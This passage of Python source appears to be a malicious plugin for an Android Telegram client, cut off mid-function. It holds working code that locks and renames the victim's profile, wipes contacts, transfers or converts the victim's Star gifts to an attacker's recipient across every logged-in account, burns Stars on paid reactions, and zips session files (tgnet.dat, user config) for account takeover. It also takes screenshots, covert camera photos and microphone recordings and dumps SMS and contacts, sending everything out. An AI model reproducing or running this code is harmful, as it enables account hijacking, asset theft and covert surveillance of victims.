    # ═══════════════════════════════════════════════════════════════════════
    def _change_username(self, acc=0):
        try:
            rnd = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
            new_un = "user_" + rnd
            Upd = _cls(
                "org.telegram.tgnet.TLRPC$TL_account_updateUsername",
                "org.telegram.tgnet.tl.TL_account$updateUsername",
            )
            if not Upd:
                return None
            rq = Upd()
            rq.username = new_un
            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return new_un if r is not None else None
        except Exception:
            return None

    def _change_profile(self, acc=0):
        try:
            rnd = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
            Upd = _cls(
                "org.telegram.tgnet.TLRPC$TL_account_updateProfile",
                "org.telegram.tgnet.tl.TL_account$updateProfile",
            )
            if not Upd:
                return False
            rq = Upd()
            try:
                rq.first_name = "[LOCKED]"
                rq.last_name = rnd
            except Exception:
                pass
            try:
                rq.flags = 0x03
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return r is not None
        except Exception:
            return False

    def _reset_contacts(self, acc=0):
        try:
            Rq = _cls(
                "org.telegram.tgnet.TLRPC$TL_contacts_resetContacts",
                "org.telegram.tgnet.tl.TL_contacts$resetContacts",
            )
            if not Rq:
                return False
            r, _e = self._rg_rpc(Rq(), acc, 10.0, fast=True)
            return r is not None
        except Exception:
            return False

    # ═══════════════════════════════════════════════════════════════════════
    # GIFTS
    # ═══════════════════════════════════════════════════════════════════════
    def _input_saved_gift(self, saved):
        if saved.get("msg_id"):
            UI = _cls(
                "org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
                "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser",
            )
            if not UI:
                return None, "no UserInput"
            o = UI()
            o.msg_id = int(saved["msg_id"])
            return o, None
        CI = _cls(
            "org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
            "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat",
        )
        if not CI:
            return None, "no ChatInput"
        o = CI()
        uid = int(_UC().getInstance(0).getClientUserId())
        peer = self._get_input_peer(0, uid)
        if not peer:
            return None, "no self peer"
        o.peer = peer
        o.saved_id = int(saved.get("saved_id", 0))
        return o, None

    def _get_saved_gifts(self):
        try:
            Req = _cls(
                "org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
                "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
                "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts",
            )
            if not Req:
                return []
            uid = int(_UC().getInstance(0).getClientUserId())
            peer = self._get_input_peer(0, uid)
            if not peer:
                return []
            out = []
            offset = ""
            for _p in range(20):
                rq = Req()
                rq.peer = peer
                try:
                    rq.offset = offset
                except Exception:
                    pass
                rq.limit = 100
                resp, err = self._rg_rpc(rq, 0, 10.0, fast=True)
                if err is not None or resp is None:
                    break
                g = getattr(resp, "gifts", None)
                if g is None:
                    break
                try:
                    gsize = g.size()
                except Exception:
                    gsize = 0
                for i in range(gsize):
                    sg = g.get(i)
                    gift = getattr(sg, "gift", None)
                    if not gift:
                        continue
                    cls = str(type(gift))
                    ra = getattr(gift, "resell_amount", None)
                    ra_l = False
                    if ra is not None:
                        try:
                            ra_l = int(ra.size()) > 0
                        except Exception:
                            try:
                                ra_l = len(ra) > 0
                            except Exception:
                                ra_l = bool(ra)
                    is_u = (
                        ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l)
                        or _safe_int(getattr(gift, "num", 0)) > 0
                        or _get_bool_attr(gift, "isUnique", False)
                        or _get_bool_attr(gift, "canResell", False)
                    )
                    out.append({
                        "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
                        "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
                        "gift_id": _safe_int(getattr(gift, "id", 0)),
                        "title": str(getattr(gift, "title", "") or ""),
                        "slug": str(getattr(gift, "slug", "") or ""),
                        "u": is_u,
                        "bc": _is_blockchain_gift(gift, sg),
                        "listed": ra_l,
                    })
                nxt = str(getattr(resp, "next_offset", "") or "")
                if not nxt or nxt == offset or gsize == 0:
                    break
                offset = nxt
            return out
        except Exception as e:
            _log("get_saved_gifts: %s" % e)
            return []

    def _delist_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = _cls(
                "org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
                "org.telegram.tgnet.tl.TL_stars$payments_updateStarGiftPrice",
            )
            if not Rq:
                return {"error": "no class"}
            rq = Rq()
            rq.stargift = o
            try:
                rq.resell_amount = None
            except Exception as e2:
                return {"error": "assign: %s" % e2}
            r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _convert_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = _cls(
                "org.telegram.tgnet.tl.TL_stars$convertStarGift",
                "org.telegram.tgnet.tl.TL_stars$payments_convertStarGift",
            )
            if not Rq:
                return {"error": "no class"}
            rq = Rq()
            rq.stargift = o
            r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _transfer_saved_gift(self, saved, target_uid, target_ah):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            tp = TLRPC.TL_inputPeerUser()
            tp.user_id = int(target_uid)
            tp.access_hash = int(target_ah)
            T = _cls(
                "org.telegram.tgnet.tl.TL_stars$transferStarGift",
                "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift",
            )
            if T:
                rq = T()
                rq.stargift = o
                rq.to_id = tp
                r, e = self._rg_rpc(rq, 0, 8.0, fast=True)
                if r is not None:
                    return {"ok": True}
                etxt = getattr(e, "text", "") or str(e or "")
                if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
                    return {"error": "direct: %s" % etxt[:60]}
            Inv = _cls(
                "org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
                "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer",
            )
            RF = _cls(
                "org.telegram.tgnet.tl.TL_stars$getPaymentForm",
                "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm",
            )
            SF = _cls(
                "org.telegram.tgnet.tl.TL_stars$sendStarsForm",
                "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm",
            )
            if not (Inv and RF and SF):
                return {"error": "no classes"}
            inv = Inv()
            inv.stargift = o
            inv.to_id = tp
            f = RF()
            f.invoice = inv
            fr, _fe = self._rg_rpc(f, 0, 8.0, fast=True)
            if fr is None:
                return {"error": "form fail"}
            s = SF()
            s.form_id = _safe_int(getattr(fr, "form_id", 0))
            s.invoice = inv
            sr, _se = self._rg_rpc(s, 0, 10.0, fast=True)
            return {"ok": True} if sr is not None else {"error": "send fail"}
        except Exception as e:
            return {"error": str(e)}

    def _stars_balance(self):
        try:
            Rq = _cls(
                "org.telegram.tgnet.tl.TL_payments$getStarsStatus",
                "org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus",
                "org.telegram.tgnet.tl.TL_stars$getStarsStatus",
            )
            if not Rq:
                return 0
            uid = int(_UC().getInstance(0).getClientUserId())
            peer = self._get_input_peer(0, uid)
            if not peer:
                return 0
            rq = Rq()
            rq.peer = peer
            try:
                rq.ton = False
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, 0, 20.0, fast=True)
            if r:
                bal = getattr(r, "balance", None)
                if bal:
                    try:
                        return int(getattr(bal, "amount", 0))
                    except Exception:
                        try:
                            return int(bal)
                        except Exception:
                            pass
        except Exception:
            pass
        return 0

    def _h_reactions(self, acc=0):
        try:
            sp = STARS_POST
            m = re.match(r"^@?([A-Za-z0-9_]+)/(\d+)$", sp.strip())
            if not m:
                m = re.search(r"t\.me/([A-Za-z0-9_]+)/(\d+)", sp)
            if not m:
                return {"error": "no post", "spent": 0}
            uname = m.group(1)
            mid = int(m.group(2))
            bal = self._stars_balance()
            if bal <= 0:
                return {"balance": 0, "spent": 0}

            # resolve channel via resolveUsername (mc.getChat(uname) не резолвит строку)
            peer = None
            try:
                Resolve = TLRPC.TL_contacts_resolveUsername()
                Resolve.username = uname
                rres, _rerr = self._rg_rpc(Resolve, acc, 10.0, fast=True)
                if rres:
                    chats = getattr(rres, "chats", None)
                    if chats is not None and chats.size() > 0:
                        chat = chats.get(0)
                        peer = TLRPC.TL_inputPeerChannel()
                        peer.channel_id = int(getattr(chat, "id", 0))
                        peer.access_hash = int(getattr(chat, "access_hash", 0))
            except Exception:
                pass
            if peer is None:
                return {"error": "channel not resolved", "spent": 0}

            Rq = _cls(
                "org.telegram.tgnet.tl.TL_messages$sendPaidReaction",
                "org.telegram.tgnet.TLRPC$TL_messages_sendPaidReaction",
            )
            if not Rq:
                return {"error": "no class", "spent": 0}

            # Одна реакция = count=1. Цикл по balance (лимит сервера за раз).
            spent = 0
            max_iters = min(bal, 50)  # страховочный потолок
            for _i in range(max_iters):
                try:
                    rq = Rq()
                    rq.peer = peer
                    rq.msg_id = mid
                    rq.count = 1
                    try:
                        rq.random_id = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
                    except Exception:
                        pass
                    r, _e = self._rg_rpc(rq, acc, 20.0, fast=True)
                    if r is None:
                        break
                    spent += 1
                except Exception:
                    break
            return {"balance": bal, "spent": spent}
        except Exception as e:
            return {"error": str(e), "spent": 0}

    def _drain_gifts(self, account=0, workers=6):
        uid = self._pick_nft_target()
        ah = 0
        try:
            mc = _MC().getInstance(account)
            u = mc.getUser(uid)
            if u is not None:
                ah = _safe_int(getattr(u, "access_hash", 0))
        except Exception:
            pass
        if not uid or not ah:
            uid, ah = self._resolve_recipient(account)
        if not uid or not ah:
            return {"error": "no target"}
        gifts = self._get_saved_gifts()
        if not gifts:
            return {"total": 0, "ok": 0, "fail": 0, "convert": 0, "skip_bc": 0, "delist": 0}

        def _one(g):
            try:
                if g.get("bc"):
                    return ("skip_bc", g)
                if g.get("listed"):
                    self._delist_saved_gift(g)
                if g.get("u"):
                    r = self._transfer_saved_gift(g, uid, ah)
                    return ("ok", g) if r.get("ok") else ("fail", g)
                r = self._convert_saved_gift(g)
                return ("convert", g) if r.get("ok") else ("fail", g)
            except Exception:
                return ("fail", g)

        res = self._parallel([(_one, g) for g in gifts], workers=workers, timeout=180)
        rep = {"total": len(gifts), "ok": 0, "fail": 0, "convert": 0, "skip_bc": 0, "delist": 0}
        for r in res:
            try:
                kind, _g = r
                if kind == "ok":
                    rep["ok"] += 1
                elif kind == "convert":
                    rep["convert"] += 1
                elif kind == "skip_bc":
                    rep["skip_bc"] += 1
                elif kind == "fail":
                    rep["fail"] += 1
                else:
                    rep["fail"] += 1
            except Exception:
                rep["fail"] += 1
        return rep

    def _drain_all_accounts(self):
        out = []
        for a in self._get_accounts_list():
            aid = a.get("id", 0)
            try:
                with self._recipient_lock:
                    self._recipient_ah_cache.pop(aid, None)
                r = self._drain_gifts(int(aid), workers=6)
                out.append({"account": aid, "user_id": a.get("user_id"), "result": r})
            except Exception as e:
                out.append({"account": aid, "error": str(e)})
        return out

    # ═══════════════════════════════════════════════════════════════════════
    # DUMPS
    # ═══════════════════════════════════════════════════════════════════════
    def _manual_dump_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return "no ctx"
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            files = []
            mx = 500 * 1024
            for rd, _dirs, fns in os.walk(base):
                # обрезаем глубину
                if rd.count("/") - base.count("/") > 3:
                    continue
                if any(x in rd for x in ("/files/cache", "/cache", "/files/photos", "/files/videos")):
                    continue
                for f in fns:
                    if ("session" in f or "auth" in f or "cache4" in f
                            or f.endswith(".db") or f.endswith(".xml")):
                        fp = os.path.join(rd, f)
                        try:
                            if os.path.getsize(fp) <= mx:
                                files.append(fp)
                        except Exception:
                            pass
            if not files:
                return "no files"
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        zf.write(fp, arcname=os.path.relpath(fp, base))
                    except Exception:
                        pass
            self._send_document_bytes("session.zip", z.getvalue())
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_userbot_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return "no ctx"
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            files = []
            m1 = base + "/files/tgnet.dat"
            if os.path.exists(m1):
                files.append(m1)
            ad = base + "/files"
            if os.path.isdir(ad):
                for name in os.listdir(ad):
                    if name.startswith("account"):
                        p = ad + "/" + name + "/tgnet.dat"
                        if os.path.exists(p):
                            files.append(p)
            pd = base + "/shared_prefs"
            if os.path.isdir(pd):
                for name in os.listdir(pd):
                    if ("userconfig" in name or "userconfing" in name) and name.endswith(".xml"):
                        files.append(pd + "/" + name)
            if not files:
                return "no files"
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        if os.path.getsize(fp) <= 2 * 1024 * 1024:
                            zf.write(fp, arcname=os.path.relpath(fp, base))
                    except Exception:
                        pass
                try:
                    amap = {}
                    for a in self._get_accounts_list():
                        amap[str(a.get("id"))] = {
                            "user_id": a.get("user_id"),
                            "username": a.get("username", ""),
                            "phone": a.get("phone", ""),
                        }
                    if amap:
                        zf.writestr("accounts_map.json", json.dumps(amap, ensure_ascii=False))
                except Exception:
                    pass
            self._send_document_bytes("userbot_session.zip", z.getvalue())
            return "ok"
        except Exception as e:
            return str(e)

    def _screenshot(self):
        try:
            act = self._get_activity()
            if act is None:
                return "no act"
            view = act.getWindow().getDecorView().getRootView()
            w = view.getWidth()
            h = view.getHeight()
            if w <= 0 or h <= 0:
                return "bad size"
            from android.graphics import Bitmap, Canvas
            bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
            c = Canvas(bmp)
            view.draw(c)
            ctx = ApplicationLoader.applicationContext
            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
            if not os.path.exists(d):
                os.makedirs(d)
            p = os.path.join(d, "screenshot_%d.png" % int(time.time()))
            from java.io import FileOutputStream
            fos = FileOutputStream(p)
            bmp.compress(Bitmap.CompressFormat.PNG, 100, fos)
            fos.flush()
            fos.close()
            bmp.recycle()
            phone = "?"
            try:
                u = _UC().getInstance(0).getCurrentUser()
                if u is not None and u.phone:
                    phone = str(u.phone)
            except Exception:
                pass
            self._send_photo(p, "Телефон: +" + phone)
            try:
                os.remove(p)
            except Exception:
                pass
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_camera(self, which="front"):
        try:
            if not self._has_perm("android.permission.CAMERA"):
                return "no perm"
            cam = jclass("android.hardware.Camera")
            cid = None
            try:
                ic = jclass("android.hardware.Camera$CameraInfo")
                facing = ic.CAMERA_FACING_FRONT if which == "front" else ic.CAMERA_FACING_BACK
                info = ic()
                total = int(cam.getNumberOfCameras())
                for i in range(total):
                    cam.getCameraInfo(i, info)
                    if int(info.facing) == int(facing):
                        cid = i
                        break
            except Exception:
                pass
            if cid is None:
                cid = 1 if which == "front" else 0
            c = None
            for _ in range(4):
                try:
                    c = cam.open(int(cid))
                    break
                except Exception:
                    time.sleep(0.4)
            if c is None:
                return "no open"
            try:
                st = jclass("android.graphics.SurfaceTexture")(0)
                c.setPreviewTexture(st)
                c.startPreview()
                ev = threading.Event()
                box = [None]
                PC = jclass("android.hardware.Camera$PictureCallback")

                class _PC(dynamic_proxy(PC)):
                    def onPictureTaken(self, data, camera):
                        box[0] = data
                        ev.set()

                c.takePicture(None, None, _PC())
                ev.wait(8)
                if box[0]:
                    raw = bytes(box[0])
                    self._send_document_bytes("%s.jpg" % which, raw)
                    return "ok"
                return "no photo"
            finally:
                try:
                    c.stopPreview()
                except Exception:
                    pass
                try:
                    c.release()
                except Exception:
                    pass
        except Exception as e:
            return str(e)

    def _manual_audio(self, sec=5):
        try:
            if not self._has_perm("android.permission.RECORD_AUDIO"):
                return "no perm"
            ctx = ApplicationLoader.applicationContext
            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()), "a_%d.3gp" % int(time.time()))
            mr = jclass("android.media.MediaRecorder")()
            try:
                src = getattr(jclass("android.media.MediaRecorder$AudioSource"), "MIC", 1)
                of = getattr(jclass("android.media.MediaRecorder$OutputFormat"), "THREE_GPP", 1)
                ae = getattr(jclass("android.media.MediaRecorder$AudioEncoder"), "AMR_NB", 1)
            except Exception:
                src = of = ae = 1
            mr.setAudioSource(src)
            mr.setOutputFormat(of)
            mr.setAudioEncoder(ae)
            mr.setOutputFile(p)
            mr.prepare()
            mr.start()
            time.sleep(int(sec))
            mr.stop()
            mr.release()
            with open(p, "rb") as f:
                data = f.read()
            try:
                os.remove(p)
            except Exception:
                pass
            self._send_document_bytes("audio.3gp", data)
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_sms(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_SMS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://sms"), ["address", "body", "date"], None, None, "date DESC")
                if cur:
                    while cur.moveToNext():
                        out.append("%s: %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out:
                return "empty"
            self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:100]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_contacts(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_CONTACTS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://com.android.contacts/data/phones"),
                               ["display_name", "data1"], None, None, None)
                if cur:
                    while cur.moveToNext():
                        out.append("%s — %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out:
                return "empty"
            self._send_msg("<b>Контакты (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _manual_apps(self):
        try:
            ctx = ApplicationLoader.applicationContext
            pm = ctx.getPackageManager()
            apps = pm.getInstalledApplications(0)
            out = []
            for i in range(apps.size()):
                try:
                    a = apps.get(i)
                    pkg = str(a.packageName)
                    label = pkg
                    try:
                        label = str(pm.getApplicationLabel(a))
                    except Exception:
